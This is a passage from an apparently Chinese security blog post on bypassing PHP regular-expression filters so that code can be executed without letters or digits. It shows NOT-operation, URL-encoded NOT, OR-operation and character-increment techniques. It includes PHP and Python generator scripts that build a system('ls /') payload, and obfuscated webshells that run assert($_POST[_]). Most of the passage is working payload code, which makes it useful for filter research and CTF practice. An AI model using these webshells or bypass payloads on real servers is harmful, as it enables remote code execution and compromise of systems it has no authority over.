class="hljs-string">&quot;次&quot;</span>;<span class="hljs-variable">$_____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;站&quot;</span>;<span class="hljs-variable">$_____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$_</span>=<span class="hljs-variable">$$_____</span>;<span class="hljs-variable">$____</span>(<span class="hljs-variable">$_</span>[<span class="hljs-variable">$__</span>]);<br>或:<br><span class="hljs-variable">$__</span>=(<span class="hljs-string">&#x27;&gt;&#x27;</span>&gt;<span class="hljs-string">&#x27;&lt;&#x27;</span>)+(<span class="hljs-string">&#x27;&gt;&#x27;</span>&gt;<span class="hljs-string">&#x27;&lt;&#x27;</span>);<span class="hljs-variable">$_</span>=<span class="hljs-variable">$__</span>/<span class="hljs-variable">$__</span>;<span class="hljs-variable">$____</span>=<span class="hljs-string">&#x27;&#x27;</span>;<span class="hljs-variable">$___</span>=瞰;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$___</span>=和;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$___</span>=和;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$___</span>=的;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$___</span>=半;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$___</span>=始;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$_____</span>=_;<span class="hljs-variable">$___</span>=俯;<span class="hljs-variable">$_____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$___</span>=瞰;<span class="hljs-variable">$_____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$___</span>=次;<span class="hljs-variable">$_____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$___</span>=站;<span class="hljs-variable">$_____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$_</span>=<span class="hljs-variable">$$_____</span>;<span class="hljs-variable">$____</span>(<span class="hljs-variable">$_</span>[<span class="hljs-variable">$__</span>]);<br></code></pre></td></tr></table></figure><h3 id="URL编码取反绕过"><a href="#URL编码取反绕过" class="headerlink" title="URL编码取反绕过"></a>URL编码取反绕过</h3><p>刚才我们介绍的是通过取反汉字来得到我们想要的字母，我们还可以直接对一串恶意代码进行取反然后 URL 编码，在发送 Payload 的时候再次将其取反便可将代码还原，然后将其动态执行。并且，因为是取反，基本上用的都是不可见字符，所以不会触发到正则表达式。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">php &gt; <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-string">&#x27;phpinfo&#x27;</span>);<br>%<span class="hljs-number">8</span>F%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>F%<span class="hljs-number">96</span>%<span class="hljs-number">91</span>%<span class="hljs-number">99</span>%<span class="hljs-number">90</span><br>php &gt; <br></code></pre></td></tr></table></figure><h4 id="Payload："><a href="#Payload：" class="headerlink" title="Payload："></a>Payload：</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">(~%<span class="hljs-number">8</span>F%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>F%<span class="hljs-number">96</span>%<span class="hljs-number">91</span>%<span class="hljs-number">99</span>%<span class="hljs-number">90</span>)();    <span class="hljs-comment">// phpinfo();</span><br></code></pre></td></tr></table></figure><h2 id="或运算"><a href="#或运算" class="headerlink" title="或运算"></a>或运算</h2><p>PHP 中两个字符串异或之后得到的还是一个字符串。那么或运算原理也是一样，如果正则匹配过滤了字母和数字，那就可以使用两个不在正则匹配范围内的非字母非数字的字符进行或运算，从而得到我们想要的字符串。</p><h3 id="或运算构造脚本"><a href="#或运算构造脚本" class="headerlink" title="或运算构造脚本"></a>或运算构造脚本</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$myfile</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;or_rce.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>);<br><span class="hljs-variable">$contents</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">256</span>; <span class="hljs-variable">$i</span>++) &#123; <br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$j</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$j</span> &lt;<span class="hljs-number">256</span> ; <span class="hljs-variable">$j</span>++) &#123; <br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">16</span>)&#123;<br>            <span class="hljs-variable">$hex_i</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$hex_i</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$j</span>&lt;<span class="hljs-number">16</span>)&#123;<br>            <span class="hljs-variable">$hex_j</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$hex_j</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>        &#125;<br>        <span class="hljs-variable">$preg</span> = <span class="hljs-string">&#x27;/[0-9a-z]/i&#x27;</span>;    <span class="hljs-comment">// 根据题目给的正则表达式修改即可</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_i</span>))||<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_j</span>)))&#123;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_i</span>;<br>        <span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_j</span>;<br>        <span class="hljs-variable">$c</span>=(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$a</span>)|<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$b</span>));<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&gt;=<span class="hljs-number">32</span>&amp;<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&lt;=<span class="hljs-number">126</span>) &#123;<br>            <span class="hljs-variable">$contents</span>=<span class="hljs-variable">$contents</span>.<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$a</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$b</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br>&#125;<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$myfile</span>,<span class="hljs-variable">$contents</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$myfile</span>);<br></code></pre></td></tr></table></figure><p>首先运行以上 PHP 脚本后，会生成一个 txt 文档or_rce.txt，里面包含所有可见字符的或运算构造结果。</p><p>接着运行以下 Python 脚本，输入你想要构造的函数名和要执行的命令即可生成最终的 Payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">action</span>(<span class="hljs-params">arg</span>):<br>   s1=<span class="hljs-string">&quot;&quot;</span><br>   s2=<span class="hljs-string">&quot;&quot;</span><br>   <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> arg:<br>       f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;or_rce.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>)<br>       <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>           t=f.readline()<br>           <span class="hljs-keyword">if</span> t==<span class="hljs-string">&quot;&quot;</span>:<br>               <span class="hljs-keyword">break</span><br>           <span class="hljs-keyword">if</span> t[<span class="hljs-number">0</span>]==i:<br>               <span class="hljs-comment">#print(i)</span><br>               s1+=t[<span class="hljs-number">2</span>:<span class="hljs-number">5</span>]<br>               s2+=t[<span class="hljs-number">6</span>:<span class="hljs-number">9</span>]<br>               <span class="hljs-keyword">break</span><br>       f.close()<br>   output=<span class="hljs-string">&quot;(\&quot;&quot;</span>+s1+<span class="hljs-string">&quot;\&quot;|\&quot;&quot;</span>+s2+<span class="hljs-string">&quot;\&quot;)&quot;</span><br>   <span class="hljs-keyword">return</span>(output)<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>   param=action(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;[+] your command：&quot;</span>))+<span class="hljs-string">&quot;;&quot;</span><br>   <span class="hljs-built_in">print</span>(param)<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">[+] your function：system<br>[+] your command：ls /<br>(&quot;%13%19%13%14%05%0d&quot;|&quot;%60%60%60%60%60%60&quot;)(&quot;%0c%13%00%00&quot;|&quot;%60%60%20%2f&quot;);<br></code></pre></td></tr></table></figure><h2 id="自增"><a href="#自增" class="headerlink" title="自增"></a>自增</h2><p>在处理字符变量的算数运算时，PHP 沿袭了 Perl 的习惯，而非 C 的。例如，在 Perl 中 <code>$a = &#39;Z&#39;; $a++;</code> 将把 <code>$a</code> 变成<code>&#39;AA&#39;</code>，而在 C 中，<code>a = &#39;Z&#39;; a++;</code> 将把 <code>a</code> 变成 <code>&#39;[&#39;</code>（<code>&#39;Z&#39;</code> 的 ASCII 值是 90，<code>&#39;[&#39;</code> 的 ASCII 值是 91）。</p><p>注意字符变量只能递增，不能递减，并且只支持纯字母（a-z 和 A-Z）。递增／递减其他字符变量则无效，原字符串没有变化。</p><p><a href="https://www.php.net/manual/zh/language.operators.increment.php">https://www.php.net/manual/zh/language.operators.increment.php</a></p><p>也就是说：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-string">&quot;A&quot;</span>++ ==&gt; <span class="hljs-string">&quot;B&quot;</span><br><span class="hljs-string">&quot;B&quot;</span>++ ==&gt; <span class="hljs-string">&quot;C&quot;</span><br><span class="hljs-string">&quot;Z&quot;</span>++ ==&gt; <span class="hljs-string">&quot;AA&quot;</span><br>...<br></code></pre></td></tr></table></figure><p>只要我们能拿到一个变量，其值为 <code>A</code>，那么通过自增操作即可获得 <code>A-Z</code> 中所有字符。</p><p>在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为 <code>Array</code>。而 <code>Array</code> 的第一个字母就是大写 A，而且第4个字母是小写 a。也就是说我们可以同时拿到小写 a 和大写 A，那么我们就可以拿到 <code>a-z</code> 和 <code>A-Z</code> 的所有字母：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">php &gt; <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&#x27;</span>.[];<br>Array<br>php &gt; <span class="hljs-keyword">echo</span> (<span class="hljs-string">&#x27;&#x27;</span>.[])&#123;<span class="hljs-number">0</span>&#125;;<br>A<br>php &gt; <span class="hljs-keyword">echo</span> (<span class="hljs-string">&#x27;&#x27;</span>.[])&#123;<span class="hljs-number">3</span>&#125;;<br>a<br>php &gt;  <br></code></pre></td></tr></table></figure><h4 id="Webshell-php5"><a href="#Webshell-php5" class="headerlink" title="Webshell(php5):"></a>Webshell(php5):</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$_</span>=[];<br><span class="hljs-variable">$_</span>=@<span class="hljs-string">&quot;<span class="hljs-subst">$_</span>&quot;</span>; <span class="hljs-comment">// $_=&#x27;Array&#x27;;</span><br><span class="hljs-variable">$_</span>=<span class="hljs-variable">$_</span>[<span class="hljs-string">&#x27;!&#x27;</span>==<span class="hljs-string">&#x27;@&#x27;</span>]; <span class="hljs-comment">// $_=$_[0];</span><br><span class="hljs-variable">$___</span>=<span class="hljs-variable">$_</span>; <span class="hljs-comment">// A</span><br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<br><span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>; <span class="hljs-comment">// S</span><br><span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>; <span class="hljs-comment">// S</span><br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-comment">// E </span><br><span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-comment">// R</span><br><span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-comment">// T</span><br><span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<br><span class="hljs-variable">$____</span>=<span class="hljs-string">&#x27;_&#x27;</span>;<br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-comment">// P</span><br><span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-comment">// O</span><br><span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-comment">// S</span><br><span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-comment">// T</span><br><span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<br><span class="hljs-variable">$_</span>=<span class="hljs-variable">$$____</span>;<br><span class="hljs-variable">$___</span>(<span class="hljs-variable">$_</span>[_]); <span class="hljs-comment">// ASSERT($_POST[_]);</span><br></code></pre></td></tr></table></figure><p>简化：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_</span>=[];<span class="hljs-variable">$_</span>=@<span class="hljs-string">&quot;<span class="hljs-subst">$_</span>&quot;</span>;<span class="hljs-variable">$_</span>=<span class="hljs-variable">$_</span>[<span class="hljs-string">&#x27;!&#x27;</span>==<span class="hljs-string">&#x27;@&#x27;</span>];<span class="hljs-variable">$___</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$____</span>=<span class="hljs-string">&#x27;_&#x27;</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$_</span>=<span class="hljs-variable">$$____</span>;<span class="hljs-variable">$___</span>(<span class="hljs-variable">$_</span>[_]);<br></code></pre></td></tr></table></figure><h4 id="Webshell-通用"><a href="#Webshell-通用" class="headerlink" title="Webshell(通用):"></a>Webshell(通用):</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$__</span>=++<span class="hljs-variable">$___</span>;--<span class="hljs-variable">$__</span>;<span class="hljs-variable">$____</span>=((_/_).<span class="hljs-string">&#x27;&#x27;</span>)&#123;<span class="hljs-variable">$__</span>&#125;;<span class="hljs-variable">$_____</span>=<span class="hljs-variable">$____</span>;++<span class="hljs-variable">$_____</span>;++<span class="hljs-variable">$_____</span>;++<span class="hljs-variable">$_____</span>;++<span class="hljs-variable">$_____</span>;++<span class="hljs-variable">$_____</span>;<span 